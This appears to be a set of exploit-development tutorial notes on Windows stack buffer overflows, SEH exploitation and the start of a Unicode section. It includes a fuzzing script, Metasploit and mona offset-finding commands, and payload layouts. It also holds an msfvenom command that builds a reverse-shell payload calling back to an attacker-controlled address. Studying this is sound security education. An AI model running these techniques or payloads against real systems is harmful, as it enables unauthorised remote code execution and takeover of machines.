<h1 align="center">Exploit development</h1>

-   **Stack Buffer overflow**

    -   **Direct EIP Overflow**

    -   **Jumping to shellcode methods**

    -   **SEH based Overflow**

    -   **Unicode Buffer overflow**

    -   **Egg hunter**

-   **Memory security Mechanisms**

    -   **ASLR**

    -   **SAFESEH**

    -   **DEP**

    -   **Stack cookie (Canary)**

-   **Heap Buffer Overflow**

    -   **Heap**

    -   **Heap Overflows**

    -   **Use After Free**

    -   **Heap Spraying**

    -   **Metadata Corruption**

-   **Format string overflow**

-   **Integer overflow**

-   **Return Oriented Programing**

**\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--**

-   # Stack Buffer overflow

    -   ## Direct EIP Overwrite

        -   **introduction**

            -   **these functions are vulnerable for buffer overflow in C**

                -   strcpy ()

                -   strcat ()

                -   sprintf ()

                -   vsprintf ()

                -   gets() 

                    -   This is because these functions don’t employ bounds checking so it does not validate the space allocated for variable c and will continue to write to the stack until argunments has been written in its entirety.

            -   **Vulnerable c code to Buffer overflow**

                -   \#include \<stdio.h\>

                -   \#include \<string.h\>

                -   int main(int argc, char \*argv\[\]) {     

                -     char buffer\[64\];

                -          if (argc \< 2)     {        

                -                  printf(\"Error - You must supply at least on argument\\n\");               

                -               return 1;     }      

                -         strcpy(buffer, argv\[1\]);       

                -                return 0; }

            -   **Overview**

                -   The easiest way to make an application do something different is by controlling its application flow (and redirect it to somewhere else).  This can be done by controlling the Instruction Pointer (or Program Counter), which is a CPU register that contains a pointer to where the next instruction that needs to be executed is located.

                -   When a function/subroutine is entered, a stack frame is created. This frame keeps the parameters of the parent procedure together and is used to pass arguments to the subrouting.  The current location of the stack can be accessed via the stack pointer (ESP), the current base of the function is contained in the base pointer (EBP) (or frame pointer).

                -   So when an application calls a function with a parameter. Before going to the function, it saves the current location in the instruction pointer (so it knows where to return when the function completes).  If you can modify the value in this pointer, and point it to a location in memory that contains your own piece of code, then you can change the application flow and make it execute something different (other than returning back to the original place). The code that you want to be executed after controlling the flow is often referred to as "shellcode". So if we make the application run our shellcode, we can call it a working exploit.  In most cases, this pointer is referenced by the term EIP. This register size is 4 bytes. So if you can modify those 4 bytes, you own the application

            -   **Buffer overflow steps**

                1.  scan the target and download the app its use to fuzz it

                2.  Create a large buffer and fuzz the app to trigger the overflow. 

                3.  Take control of EIP by overwriting a return address on the stack by padding the large buffer with an appropriate offset. 

                4.  Include a chosen payload in the buffer prepended by an optional NOP sled. 

                5.  Choose a correct return address instruction such as JMP ESP (or different register) in order to redirect the execution flow into our payload.

        -   ### Fuzzing the app : 

            -   **Fuzzing methods :**

                -   using spike : ./line\_send\_tcp \<ip\> \<port\> ./audits/ftpd/script.apk 0 0   

                    -   //fuzzing an ftp app 0 0   are var1 in the app and value1 in the fuzzing 

                -   manually

                    -   ex : echo -e \"HOST AAAAAAAAAAAAAAAAAAAAAAAAA\" \| netcat \<ip\> \<port\>

                -   Fuzzing using a script with python :

                    -   import socket,time

                    -   host = \"127.0.0.1\"

                    -   crash = \"\\x41\" \* 100

                    -   while True:

                    -   s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)

                    -   print \"\[\*\]Sending evil buffer\...\"

                    -   s.connect((host, 13327))

                    -   data = s.recv(1024)

                    -   print data

                    -   print \"\[\*\]Sending:\", len(crash), \"Bytes\...\"

                    -   buffer = \"\\x11(setup sound \" + crash + \"\\x90\\x00\#\"

                    -   s.send(buffer)

                    -   s.close()

                    -   print \"\[\*\]Payload Sent !\"

                    -   print \"\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\#\"

                    -   time.sleep(0.5)

                    -   crash = crash + \"\\x41\" \* 200

            -   sending a lot of inputs to the vulnerable variable in the app , in this app the vulnerable variable is "host"

                -   \<echo -e \"HOST 743 \* \'A\' \|   netcat \<ip\> \<port\>\"\>

            -   After that we know the length of our payload that crashed the app  echo -e \"variable AAAAAAAAAAAAAAAAAAAAAAAAA\" \| wc -w =746

            -   so the number of A\'s used is 741 because the length of \[ HOST + the space \] = 5

        -   ### Determine which part of the payload that overwrites the EIP :

            -   **There are two common ways to do this.**

                -   First, we could attempt **binary tree analysis**. Instead of 800 A's, we send 400 A's and 400 B's. If EIP is overwritten by B's, we know the four bytes reside in the second half of the buffer. We then change the 400 B's to 200 B's and 200 C's, and send the buffer again. If EIP is overwritten by C's, we know that the four bytes reside in the 600--800 byte range. We continue splitting the specific buffer until we reach the exact four bytes that overwrite EIP. Mathematically, this should happen in seven iterations.

                -   However, there is a faster way to identify the location of these four bytes. We could use a sufficiently long string that consists of non-repeating 4-byte chunks as our fuzzing input. Then, when the EIP is overwritten with 4 bytes from our string, we can use their unique sequence to pinpoint exactly where in the entire input buffer they are located. While this may be slightly hard to understand at first, it becomes clearer when we apply the technique.

            -   **Mona plugin**

                -   If you want to use mona to generate the metasploit pattern, you can type 

                    -   !mona pc 50,000 and it will write the pattern to a text file

                -   You can now use the findmsp mona command. With this command

                    -   (!mona findmsp)

                -   Mona will locate the EIP overwrite as well as other very useful information such as which registers contain portions of your buffer and the length of each register

            -   **Metasploit**

                -   We'll by using a metasploit tool \"./pattern\" that produces a payload with  non repeatable words to be able to determine which part that overwrite the EIP  script is located in /usr/share/metasploit-framework/tools/exploit/

                    -   msf-pattern\_create -h 

                    -   msf-pattern\_create -l  \<lenght of payload\>  

                    -   msf-pattern\_create -l  741

                -   then take the output and replace it by the A\'s of our first payload

                -   then we can msf-pattern\_offset to determine the EIP offset by coping the value in the EIP register and use it with metasploit tool \"./pattern\_offset.r\"

                    -   msf-pattern\_offset -l 741 -q \<value in hex\>

                -   the 741-byte pattern ,    will be the length after which we will reach the address of the EIP  \"let's assume its 246\"

        -   ### Overwrite the EIP with the address of your choice:

            -   payload= 246 \* \"A\" + \"BBBB\" + 487 \* \"C\"  

                -    \#total 741  (741-246=491-4=487) NOW THE EIP value will be BBBB=42424242

            -   Looking back at the registers after our last crash we notice that the ESP register points to our buffer of C's. Since we could easily access this location at crash time through the address stored in ESP, this seems like a convenient location for our shellcode (not only ESP register can be used any register that is pointing to our shellcode can be used)

            -   payload= 246 \* \"A\" + \"\<address of esp\>\" + 487 \* \"C\"  

                -    \#total 741  (741-246=491-4=487) the 4 is the size of the eip

            -   Let's assume add of esp is 77DB565c (big Indian)   we will write it as \"\\x5c\\x56\\xDB\\x77\" (little indian)

                -   to bypass ASLR we will search in the windows dll of the app for a command that says  jmp ESP because windows dll address doesn't change and we will take that address in our payload

            -   payload=246 \* \"A\" + \"\\x5c\\x56\\xDB\\x77\" + 491 \* \"C\"   

                -    the next step is to replace the \"c\" characters by the real shellcode

        -   ### Adding more memory space for our shellcode :

            -   We will add more "c" after the EIP offset to try to get more space for our shellcode

                -   payload= 246 \* \"A\" + \"\<address of esp\>\" + 687 \* \"C\"  

            -   if the exploit run without problems then its good if it didn't then we added a lot of spaces and we need to reduce it

        -   ### Checking for Bad Characters :

            -   Depending on the application, vulnerability type, and protocols in use, there may be certain characters that are considered "bad" and should not be used in our buffer, return address, or shellcode. One example of a common bad character, especially in buffer overflows caused by unchecked string copy operations, is the null byte, 0x00. This character is considered bad because a null byte is also used to terminate a string in low level languages such as C/C++.

            -   One way to determine which characters are bad for a particular exploit is to send all possible characters, from 0x00 to 0xFF, as part of our buffer, and see how the application deals with these characters after the crash.

            -   To do this, we will resend our script and replace our c's with all possible hex characters, except 0x00.  (then go and and right click follow esp in dump)

            -   EX: The output shows that only the hex values 0x01 through 0x09 made it into the stack memory buffer. There is no sign of the next character, 0x0A, which means it's an bad character and we will remove it from our shellcode and send again without 0x0A, and continue this process till the end and remove all the bad characters and it prints all the code tills the end (FF)

        -   ### Finding a Return Address :

            -   **For now we have 2 options**

                -   **Jumping to Eip with harcoded address**

                    -   Using a memory address to jump to in an exploit would make the exploit very unreliable. After all, this memory address could be different in other OS versions, languages, etc...)

                    -   Instead, we should be able to reference a register (or an offset to a register), ESP in our case, and find an instruction that will jump to that register.  Then we will try to overwrite EIP with the address of that instruction

                -   **find opcode instructions for jump esp**

                    -   we need to overwrite EIP with an address to an existing instruction such as JMP or CALL .  Remember that EIP is overwritten with an address pointer to an instruction, not an actual instruction. In other words, we can't overwrite EIP with opcode corresponding to jump ESP (\\xff\\xe4).  Instead, we need to overwrite it with a memory address that points to such an instruction. On top of that, we need to ensure that the address we use does not contain null bytes (\\x00). Why? Because a null byte acts as a terminator, meaning that once the application hits the null byte, execution terminates and anything you put after the EIP overwrite (in this case our shellcode) will not be executed.

            -   Many support libraries in Windows contain this commonly-used instruction but we need to find a reference that meets certain criteria. 

                -   First, the addresses used in the library must be static, which eliminates libraries compiled with ASLR support. 

                -   Second, the address of the instruction must not contain any of the bad characters such as null byte that would break the exploit, since the address will be part of our input buffer

            -   **To search for instructions :**

                -   We can Right-click on the CPU instruction pane of the CPU View, select "Search for" and click "All Commands in all modules".  This will search all loaded modules (.exe and all DLLs) for our jmp/call instruction. Enter the desired instruction, in this case "jmp esp ,

                -   or We can use the Immunity Debugger script, mona.py, to begin our return address search. First we will request information about all DLLs (or modules) loaded by the app into the process memory space with 

                    -   !mona modules.   

                        -   request information about all DLLs (or modules) loaded by the app  such as the current memory location (base and top addresses), the size of the module, several flags, the module version, module  name, and the path.

                    -   !mona noaslr   

                        -   choose a dll libraries that has aslr off and that belongs to the program not the os

                -   We can search for JMP ESP/call ESP using the hex representation of the opcode (0xFFE4) in all sections of LIBSSP.DLL in which has the aslr and seh disabled with mona.py find    

                    -   kali\@kali:\~\$ msf-nasm\_shell 

                    -   nasm \> jmp esp  (\"jmp esp\" \| \"call esp\")

                    -   FFE4  

                    -   !mona find -s "\\xff\\xe4" -m "libspp.dll     

            -   then the address we found we will place it in the EIP  in which it will redirect to the address that has the instruction JMP ESP that will point to our shellcode that we will use instead of the C\'s  

            -   payload= 246 \* \"A\" + \"\<address of jmp esp\>\" + 487 \* \"C\"   

                -   \#total 741  (741-246=491-4=487) the 4 is the size of the eip

            -   Notes to consider when choosing an address to an instruction from a dll :

                -   the address must not contain null byte characters x00 to not crash the shellcode

                -   try to find a dll that belongs to the application not the os to make a reliable exploit and it can work on any os not on a specefic os

                -   try to find a dll that has safeseh/aslr/dep turned off

        -   ### generate a shell code :

            -   From experience, we know that a standard reverse shell payload requires approximately 350-400 bytes of space

            -   **MSFvenom**

                -   msfpayload windows/exec CMD=calc.exe R

                    -   The CMD option is self-explanatory and the "R" stands for Raw which will output our shellcode as raw byte code.

                -   msfvenom -p windows/shell\_reverse\_tcp   LHOST=10.11.0.4    LPORT=443    EXITFUNC= thread  -f c  --e x86/shikata\_ga\_nai  \"\\x00\\x0a\\x0d\\x25\\x26\\x2b\\3d\"       

                    -   //generate a shell code with c

                    -   \<always remove bad characters from shell code that will stop our exploit\>  

            -   The shellcode produced by msfvenom was 341 byte. so 491-341=150

            -   so we will add 150 nop characters before our shell code to make it exactly the same length and also because the register can be pointing to somewhere in the middle of our shellcode not pointing to the beginning of it

            -   payload=246 \* \"A\" + \"\\x5c\\x56\\xDB\\x77\" + 150 \* \"x/90\" + shellcode   

                -   \#total lenght 741

            -   If you examined the options with the "O" parameter, you might have noticed one additional option called "EXITFUNC". This parameter controls how the shellcode will exit when completed. I didn't specify a value for EXITFUNC which means default value of "thread" will be used, which terminates only the associated thread. The other options for payload exit are SEH (let exception handler manage the exit) and Process (kill the whole process and not just the thread).  The EXITFUNC choice can make a big difference in how the exploit behaves when it terminates so you may need to experiment. For example, if you're injecting an exploit into a parent process that must continue to run after the exploit terminates, you may want to avoid process and instead stick with thread. Similarly, choosing SEH as an option if the application does not implement any error handling may cause the process to hang on exit ("Application X has encountered a problem and needs to close...").

        -   ### Exploit the vulnerable Program

            -   send our payload and start a listener on the local host and local port specified

    -   ## Jumping to shellcode

        -   The fact that we could use "jmp esp" was an almost perfect scenario. It's not that 'easy' every time. These are other ways to jump to shellcode

        -   ### JMP/CALL register

            -   If a register directly points to the shellcode we can overwrite EIP with call/jmp reg instruction.

            -   **Jmp esp**

                -   We have managed to put our shellcode exactly where ESP points at (or, if you look at it from a different angle, ESP points directly at the beginning of our shellcode).  If that would not have been the case, we would have looked to the contents of other register addresses and hope to find our buffer back.  Anyways, in this particular example, we can use ESP.

                -   The reasoning behind overwriting EIP with the address of ESP was that we want the application to jump to ESP and run the shellcode.

                -   Jumping to ESP is a very common thing in windows applications. In fact, Windows applications use one or more dll's, and these dll's contains lots of code instructions.  Furthermore, the addresses used by these dll's are pretty static. So if we could find a dll that contains the instruction to jump to esp, and if we could overwrite EIP with the address of that instruction in that dll, then it should work

            -   **Conditions**:

                -   A register points to shellcode.

            -   **Example**:

                -   \[Register\] → \[Shellcode\]

                -   EIP → JMP/CALL \[register\]

                -   EIP now points to \[register\] where shellcode.

        -   ### POP RET / POP POP RET / POP POP POP RET

            -   What if none of the registers point somewhere in our shellcode, but there's an address that points to the shellcode written on the stack somewhere, There is an address near the top of the stack that points to your buffer or ESP + N points to your buffer (where N is the number of bytes past current ESP (4, 8, 12, etc)).

            -   we can use multiple pop and one ret instruction to jump to that address

            -   Ex our shellcode can be found at ESP + 8? We can use pop ret technique. Let's simulate this case in our example.

            -   We should add 4 + 8 random bytes before our shellcode (4 bytes because in this application ESP normally points to the 5th byte of the shellcode and 8 bytes because we should simulate situation when our shellcode starts at ESP+8)

            -   **Condition:**

                -   Address at \[ESP+4\], \[ESP+8\], \[ESP+12\] (and so on) points to address to shellcode OR directly to shellcode.

            -   **Example 1:**

                -   \[ESP\] → \[4 bytes\]\[Address to shellcode\].

                -   EIP → POP \[register\] followed by RET.

                -   POP \[register\]: ESP now points to old\_ESP + 4

                -   RET: EIP now contains address to shellcode.

                -   EIP now points to shellcode.

            -   **Example 2:**

                -   \[ESP\] → \[8 bytes\]\[Address to JMP ESP\]\[shellcode\].

                -   EIP → POP \[register\] followed by POP \[register\] followed by RET:

                -   POP \[register\], POP \[register\] will get rid of 8 bytes, new ESP → old ESP + 8 (Address to JMP ESP)

                -   RET places address to JMP ESP in EIP and now ESP now points to shellcode.

                -   JMP ESP: EIP now contains ESP

                -   EIP points to current ESP value which points to start of shellcode.

        -   ### push RET

            -   push return is very similar with call\[reg\]. If one of the registers now directly pointing to the shellcode, it is possible to push the address of this register to the stack and then to make return which will take address from the stack and jump to it. This can be useful when jmp\[reg\] is not available for example. because we're unable to find the appropriate jmp/call instructions in the loaded libraries

                -   push address

                -   ret

                -   Which will pop and jump to the address that was pushed onto the stack as described above. It\'s a clever way to do an indirect jump

            -   **Condition**

                -   A register points to shellcode and can't/don't want to use method 1.

            -   **Example:**

                -   \[Register\] → \[Shellcode\]

                -    EIP → PUSH \[register\], followed by RET

                    -   Stack will first push register, then pop it to EIP.

                -   EIP now points to shellcode.

        -   ### JMP \[register + offset\]

            -   We can use this instruction if there's a register that points to our shellcode in memory, but doesn't point to the beginning of our shellcode. We can try to find the instruction "jmp \[reg+offset\]," which will add the required bytes to the register and then jump to that address, presumably to the beginning of our shellcode.

            -   If our shellcode for example can be found at ESP + 7 we can simply use jmp\[exp+7\] instruction.

            -   **Condition:**

                -   A register + offset points to shellcode.

            -   **Example:**

                -   \[Register\] → \[Shellcode\]

                -   EIP → JMP \[register + offset\]

                -   EIP will point to \[register + offset\] where the shellcode starts

            -   **Cons:**

                -   Doesn't work if \[register + offset\] points to address to shellcode as ESP doesn't change and a RET won't work.

        -   ### Blind return

            -   **Condition:**

                -       Shellcode is always loaded to the same address.

                -       Address doesn't contain a null byte.

                -       You control at least the first 4 bytes at \[ESP\]

            -   **Example:**

                -       Shellcode is always at 0xdeadbeef

                -       Since you control the first 4 bytes at ESP, put 0xdeadbeef at ESP.

                -       By pointing EIP to a RET, address at ESP will be popped to EIP.

                -       EIP now points to address 0xdeadbeef where the shellcode starts.

            -   **Pros:**

                -       Easiest method, only need a RET.

                -       Fixed address.

            -   **Cons:**

                -       Heavy dependency on hardcoded address.

                -       Address can't contain null byte (good luck with stack at low address).

                -       Assumes no ASLR and/or DEP.

        -   ### Short jumps (backwards, forwards, conditional)

            -   By incorporating unconditional and conditional jumps in our exploit, we can hop to different sections of our buffer to reach our shellcode. A near jump is a jump to a CPU instruction that is located within the current code segment. A short jump is a type of near jump that is limited in range from -128 to + 127 (from current EIP). To execute an unconditional short jump you simply use the opcode \\xeb\\xXX where XX is the number of bytes to jump. Positive (forward) short jumps have possible hex values for XX of 00 to 7F and negative (backward) short jumps from 80 to FF. In other words, a forward jump of 20 bytes is \\xeb\\x14 and a backward jump of 20 bytes is \\xeb\\xea. The forward jump is easy to understand: 14 hex = 20 decimal. But what about the backward jump --- EA hex = 234 decimal. How is that right? For a backward jump you have to do a bit of simple math. Here's how I got to \\xea...

            -   **Condition:**

                -   Shellcode is located at \[ESP + offset\] where -128 \< offset \< 127.

            -   **Example:**

                -       \[ESP + 30\] → \[Shellcode\]

                -       \[ESP\] → JMP 30

                -       EIP → \[JMP ESP\]

                -           EIP will execute a short JMP

                -       EIP will point to \[ESP + 30\] where the shellcode starts.

            -   **Pros:**

                -       Simple instruction.

                -       Reliable, no NOP sled is needed.

            -   **Cons:**

                -   Restricted by being a short JMP.

        -   ### POPAD

            -   The popad instruction simply pops the first 8 double words (4 bytes) off of the stack and into the 8 general purpose registers in the following order: EDI, ESI, EBP, ESP, EDX, ECX and EAX (with ESP being discarded). You can use the popad instruction in much the same way you use pop ret. Let's say for example, at the time of application crash, you have control over ESP + 32. Finding a pop pop pop ... pop ret sequence to get there is not likely. Instead you can overwrite EIP with a pointer to a popad + ret instruction, which will pop the first 32 bytes (8 dwords) off the stack and execute the next address on the top of the stack. To do so, we need to find an address pointing to the popad + ret sequence

            -   **Condition:**

                -       Shellcode is located at \[ESP + 32x + offset\]

                -       Enough controllable space to execute POPAD y times then JMP ESP.

            -   **Example:**

                -       \[ESP + 240\] → \[Shellcode\]

                -       \[ESP + 32 \* 7\] → \[NOP sled\]

                -       \[ESP\] → POPAD 7 times followed by JMP ESP\`

                -       EIP → \[JMP ESP\]

                    -           EIP will execute POPAD 7 times, ESP = old\_ESP + 224

                    -           EIP goes over NOP sled

                    -           EIP after executing NOP sled, it will point to \[ESP + 240\] where the shellcode starts.

            -   **Pros:**

                -       POPAD is a single byte.

                -       ESP gets incremented with 32 every time POPAD is executed.

            -   **Cons:**

                -       Requires NOP sled.

        -   ### HARDCODED Address

            -   **Condition:**

                -   Shellcode is always located at specific address.

            -   **Example:**

                -       0xdeadbeef → \[shellcode\]
2
                -       EIP → JMP ESP

                -       ESP → JMP 0xdeadbeef

        -   ### Resources

            -   <https://www.abatchy.com/2017/05/jumping-to-shellcode.html>

            -   <https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/>

    -   ## SEH EXPLOITATION

        -   ### Introduction

            -   **What is an exception?**

                -   *An exception is an [[event]{.underline}] that occurs during the [[execution]{.underline}] of a [[program]{.underline}], and requires the execution of [[code]{.underline}] outside the normal [[flow]{.underline}] of control. There are two kinds of exceptions: [[hardware]{.underline}] exceptions and software exceptions. Hardware exceptions are initiated by the CPU. They can result from the execution of certain instruction sequences, such as division by zero or an attempt to [[access]{.underline}] an invalid [[memory]{.underline}] address. Software exceptions are initiated explicitly by [[applications]{.underline}] or the [[operating]{.underline}] system. For example, the system can [[detect]{.underline}] when an invalid parameter value is specified.*

                -   Exceptions on the other hand are divided into three kinds.

                    -   **Faults**

                        -   is an exception that can generally be corrected and that, once corrected, allows the program to be restarted with no loss of continuity. When a fault is reported, the processor restores the machine state to the state prior to the beginning of execution of the faulting instruction. The return address (saved contents of the CS and EIP registers) for the fault handler points to the faulting instruction, rather than to the instruction following the faulting instruction.

                    -   **Traps**

                        -   is an exception that is reported immediately following the execution of the trapping instruction. Traps allow execution of a program or task to be continued without loss of program continuity. The return address for the trap handler points to the instruction to be executed after the trapping instruction.

                    -   **Aborts**

                        -   Aborts are used only to signal severe system problems, when operation is no longer possible.

            -   **What is Structured exception handling (SEH)**

                -   Structured Exception Handling (SEH) is a Windows mechanism for handling both hardware and software exceptions consistently.it is a useful set of functionality included in the Win32 API that lets C code handle errors in your application in much the same way that C++ handles exceptions which is often represented as a try/except or try/catch block of code  , SEH exploits happen when the exception handler of an application is manipulated

                -    Exception handling in C consists of three blocks: try, finally, and except

                    -   \_\_try {

                    -   // the block of code to try (aka the \"guarded body\")

                    -   }

                    -   \_\_except (exception filter) {

                    -   // the code to run in the event of an exception (aka the \"exception handler)

                    -   }

                -   The concept is quite simple --- try to execute a block of code and if an error/exception occurs, do whatever the "except" block (aka the *exception handler*) says. The exception handler is nothing more than another block of code that tells the system what to do in the event of an exception. In other words, it *handles* the exception.

                -   For every exception handler, there is an Exception Registration Record structure

                -   This structure ( also called a SEH record) is 8 bytes and has 2 (4 byte) elements :

                    -   a pointer to the next exception\_registration structure (in essence, to the next SEH record, in case the current handler is unable the handle the exception)

                    -   a pointer, the address of the actual code of the exception handler. (SE Handler)

                -   SEH record looks like this in c++ code:

                    -   typedef struct \_EXCEPTION\_REGISTRATION\_RECORD {

                    -   struct \_EXCEPTION\_REGISTRATION\_RECORD **\*Next**;

                    -   PEXCEPTION\_ROUTINE **Handler**;

                    -   } EXCEPTION\_REGISTRATION\_RECORD, \*PEXCEPTION\_REGISTRATION\_RECORD;

                -   EXCEPTION\_RECORD structure

                    -   typedef struct \_EXCEPTION\_RECORD {

                    -   DWORD ExceptionCode;

                    -   DWORD ExceptionFlags;

                    -   struct \_EXCEPTION\_RECORD \*ExceptionRecord;

                    -   PVOID ExceptionAddress;

                    -   DWORD NumberParameters;

                    -   DWORD ExceptionInformation\[EXCEPTION\_MAXIMUM\_PARAMETERS\]; } EXCEPTION\_RECORD;

        -   ### What is an SEH CHAIN:

        ![seh chain](images/seh/SEH_chain.jpeg)

            -   These registration records are chained together to form a linked list on the stack. The first field in the registration record (\*Next) is a pointer to the next \_EXCEPTION\_REGISTRATION\_RECORD in the SEH chain. In other words, you can navigate the SEH chain from top to bottom by using the \*Next address. The second field (Handler), is a pointer to an exception handler function which looks like this:

                -   EXCEPTION\_DISPOSITION

                -   \_\_cdecl \_except\_handler(

                -   struct \_EXCEPTION\_RECORD \*ExceptionRecord,

                -   oid EstablisherFrame,

                -   struct \_CONTEXT \*ContextRecord,

                -   void \* DispatcherContext

                -   );

            -   The first function parameter is a pointer to an \_EXCEPTION\_RECORD structure. this structure holds information about the given exception including the exception code, exception address, and number of parameters.

            -   to view the seh chain \" view\> seh chain\" or alt+s in immdebugger

            -   This SEH chain is often called the FS:\[0\] chain as well.

        -   ### What is Thread Information Block (TIB)

            -   The Thread Information Block (TIB) is a data structure in Win32 that stores information about the currently running thread

            -   Each thread has its own SEH chain. The OS knows how to locate the start of this chain by referencing the ExceptionList address of the thread information/environment block (TIB/TEB) which is located at FS:\[0\].

        -   ### What happens when an exception occurs?

            -   When an exception occurs such as a buffer overflow, Windows retrieves the head of the SEH chain walks through the list and tries to find the suitable handler to close the application properly

            -   When an exception occurs, the OS starts at the top of the chain and checks the first \_EXCEPTION\_REGISTRATION\_RECORD Handler function to see if it can handle the given error (based on the information passed in the ExceptionRecord and ContextRecord parameters). If not, it will move to the next \_EXCEPTION\_REGISTRATION\_RECORD (using the address pointed to by \*Next). It will continue moving down the chain in this manner until it finds the appropriate exception handler function. Windows places a default/generic exception handler at the end of the chain to help ensure the exception will be handled in some manner (represented by FFFFFFFF) at which point you'll likely see the "*...has encountered a problem and needs to close*" message.

        -   ### SEH Exploitation

            -   When we performs a regular stack based buffer overflow, we overwrite the return address of the Extended Instruction Pointer (EIP)  but When doing a SEH overflow, we can't directly control EIP but because SHE is also found in the stack we can  overwrite the seh and next seh (nseh) and then the eip

            -   As the Next SEH pointer is before the SE handler we can overwrite the seh handler and the Next SEH  which are are the \"*Exception Registration Record*\" and \"*Next Exception Registration Record*\"

        -   ### SEH Exploit Mitigation Techniques

            -   Zeroing of CPU registers

            -   SEHOP

            -   SafeSEH and NO\_SEH

        -   **fuzzing the app to Trigger an exception**

            -   First step is fuzzing the program to trigger a stack buffer overflow we will notice that the value of SEH and NEXT SEH are being overwritten

            -   ![seh corrupt](images/seh/SEH_corrupt.jpeg)

            -   when an seh is being triggered all registers are being xored with itself automatically to empty all registers this is a defensive routine tobe protected from exploitation so we can't jmp directly to any register

            -   despite that all registers are emptied to be protected from exploitation but we can bypass this issue by changing the junk characters that was used to overwrite the SEH to the memory address of the next SEH and because we can overwrite the next SEH then we can inject our shellcode inside the next SEH and it will be executed

            -   Next step is to know the place in buffer that overwrite the Next SHE and the SHE we can use mona plugin in this step

                -   !mona pc \<nb of bytes\>                 

                    -    pattern create that generates a payload with different characters and generate it in a file.txt

                    -   C:\\Program Files\\Immunity Inc\\Immunity Debugger\\pattern.txt

                -   !mona findmsp                     

                    -   search for pattern in memory and show it in a file 

                -   in the part of " Examining SEH chain " we can find this message Message= SEH record (nseh field) at 0x0013e998 overwritten with normal pattern : 0x42337042 (offset 1239), followed by 4753 bytes 

                -   This message says that the next she is overwritten by the pattern 1239 so the pattern that overwritten the seh is 1239+4 =1243

                -   Then the payloads now looks like

                    -   payload = \"A\" \* 1239 + \"BBBB\" + \"CCCC\" + \"D\" \* 4753

        -   **Overwriting SEH/Next SEH**

            -   **There are 2 problems to solve**

                -   Find a way to know the address of the NEXT SEH in stack in a dynamic way without using HARDCODED addresses

                -   Determining what instruction to place in the NEXT SEH that allow us to execute our shell code

            -   **we first have to know the address of next seh :**

                -   when an exception is triggered some informations concerning the SEH record are placed into the stack , one of these informations are the memory address of the NEXT SEH that is found by default on ESP + 8 at the exception time .

                -   so if all we need is to find an instruction that make us go to ESP+8 and this instruction is

                    -   pop pop ret

                -   we need to find a memory address for **pop pop ret** instruction and place that address in the SEH , thus when an exception occurs this address will be transferred to the EIP and the instruction pop pop ret will be executed and the goal of this instruction is to place the address in ESP+8 in the EIP which is the address of the NEXT SEH and thus the program will execute anything found in the next SHE code

                -   we can use mona plugin to search for pop pop ret instruction

                    -   !mona seh

                    -   show all memory addresses that has \"pop pop ret\" instruction in a file.txt

                    -   we will choose address with OS: False ASLR: False Safe SEH: False Rebase: False

            -   **what does the pop pop ret function with SEH exploits?**

                -   When an exception occurs, the exception dispatcher creates its own stack frame. It will push elements from the EH Handler on to the newly created stack (as part of a function prologue). One of the fields in the EH Structure is the EstablisherFrame. This field points to the address of the exception registration record (the next SEH) that was pushed onto the program stack. This same address is also located at ESP+8 when the handler is called. Now if we overwrite the handler with the address of a pop pop ret sequence :

                    -   the first pop will take off 4 bytes from the stack

                    -   the second pop will take another 4 bytes from the stack

                    -   the ret will take the current value from the top of ESP ( = the address of the next SEH, which was at ESP+8, but because of the 2 pop's now sits at the top of the stack) and puts that in EIP.

            -   **Determining what instruction to place in the NEXT SEH**

                -   We can use the instruction short jmp of opcode \\xeb\\x08\\ that will allow us to jump 8 bytes to be after the SEH to put our shell code

        -   **Generating a shellcode and Removing Bad characters**

        -   **Steps of exploitation**

            ![seh exploitation](images/seh/seh_exploitation.jpeg)

            -   Fuzz the application and trigger an exception

            -   know the place in buffer that overwrite the Next SEH

            -   know the place in buffer that overwrite the SEH

            -   overwrite the NEXT SEH with \\xeb\\x08\\ which is the opcode of a short jump

            -   find a memory address in the program that points to pop pop RET instruction and overwrite the SEH with this address

            -   Generate a shellcode and place it after the seh to be executed

        -   **Final payload**

             ![seh ](images/seh/seh_payload.png)

            -   typical payload will look like this

                -   \[Junk\]\[nSEH\]\[SEH\]\[Nop-Shellcode\]

                -   buffer = Junk + nSEH + SEH + NOPs + [[Shellcode]{.underline}] + Pad (NOPs are NOP [[instructions]{.underline}] (*x90*)

                -   \#NSEH will be replaced by short jmp \"\\xeb\\x08\\x90\\x90\"   (to hop onto shell code and bypass nseh)

                -   \#SEH will be replaced by the address 0x64f98f68 which points to POP,POP,RET

        -   ### Resources

            -   <https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/>

            -   http://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/

            -   <https://nakerah.net/community/resources/04-seh-based-exploits.208/>

            -   <https://resources.infosecinstitute.com/seh-exploit/>

    -   ## Unicode Buffer overflow

        -   ### ansi vs unicode :

            -   ANSI and Unicode are two character encodings that were, at one point or another, in widespread use. Usage is also the main difference between the two as ANSI is very old and is used by operating systems like Windows 95/98 and older, while Unicode is a newer encoding that is used by all of the current operating systems today. ANSI had many limitations that were not readily apparent during the early stages of its use but became painfully clear once computing started to spread globally..

            -   Most of you should be more or less familiar with ASCII(Ansi). In essence, uses 7 bits to represent 128 characters, often storing them in 8 bits, or one byte per character. The first character starts at 00 and the last is represented in hex by 7F (Ansi encoding )

            -   Year ago, Windows introduced "code pages" to accomplish string encoding by mapping ASCII and international language character sets to specific code values (e.g., A=41, B=42, etc) and storing them in individual pages. Many character sets, including ASCII, are considered single-byte character sets because each character/letter can be represented by a single byte. Other, more complex languages such as Japanese and Chinese, require double-byte encoding where some letters must be represented by two bytes. Each Windows installation is assigned a default code page corresponding to the the default language configured on the system. Depending on your default language, you may be using a different code page than I do. The most common code page is Code Page 1251 (Windows Latin I).

